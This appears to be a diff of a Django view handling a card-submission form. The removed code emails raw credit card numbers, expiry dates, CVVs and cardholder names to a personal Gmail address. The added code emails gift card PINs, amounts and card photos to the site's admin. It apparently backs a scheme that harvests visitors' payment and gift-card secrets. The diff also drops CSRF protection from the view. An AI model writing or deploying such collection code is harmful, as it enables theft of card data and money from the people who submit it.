@@ -118,31 +118,54 @@ from django.conf import settings
 # from django.shortcuts import render, redirect
 from .forms import CreditCardForm
 
-from django.views.decorators.csrf import csrf_protect
+from django.conf import settings
+from django.core.mail import EmailMessage
+from django.shortcuts import render, redirect
+from django.contrib import messages
+from .forms import CreditCardForm
 
-@csrf_protect  # Ensures CSRF token protection for form submission
 def credit_card_view(request):
     if request.method == 'POST':
-        # Extract data from POST request
-        card_number = request.POST.get('cardNumber')
-        exp_date = request.POST.get('expDate')
-        cvv = request.POST.get('cvv')
-        cardholder_name = request.POST.get('cardholderName')
+        form = CreditCardForm(request.POST, request.FILES)
+        if form.is_valid():
+            # Save the form instance
+            credit_card = form.save()
 
-        # Prepare email content
-        subject = "New Credit Card Submission"
-        message = (
-            f"Card Holder Name: {cardholder_name}\n"
-            f"Card Number: {card_number}\n"
-            f"Expiration Date: {exp_date}\n"
-            f"CVV: {cvv}"
-        )
-        admin_email = 'boltdreamz@gmail.com'
-        send_mail(subject, message, settings.DEFAULT_FROM_EMAIL, [admin_email])
+            # Construct the email
+            subject = "New Gift Card Uploaded"
+            message = (
+                f"A new gift card has been uploaded.\n\n"
+                f"Details:\n"
+                f"Card PIN: {credit_card.card_pin}\n"
+                f"Card Amount: {credit_card.card_amount}\n"
+                f"Uploaded At: {credit_card.uploaded_at}\n\n"
+                f"The card photo is attached to this email."
+            )
+            from_email = settings.DEFAULT_FROM_EMAIL
+            recipient_list = [settings.ADMIN_EMAIL]
 
-        return redirect('userauths:success')  # Redirect to a success page if needed
+            # Attach the card photo
+            email = EmailMessage(subject, message, from_email, recipient_list)
+            if credit_card.card_photo:
+                email.attach_file(credit_card.card_photo.path)
 
-    return render(request, 'userauths/credit_card_form.html')
+            # Send the email
+            email.send()
+
+            # Add success message and redirect
+            messages.success(request, 'Gift card uploaded successfully!')
+            return redirect('userauths:credit_cardcl')
+        else:
+            messages.error(request, 'Please correct the errors in the form.')
+    else:
+        form = CreditCardForm()
+
+    return render(request, 'userauths/credit_card_form.html', {
+        'form': form,
+    })
+
+    
+    
 # @login_required
 def set_pin(request):
     # if request.method == 'POST':
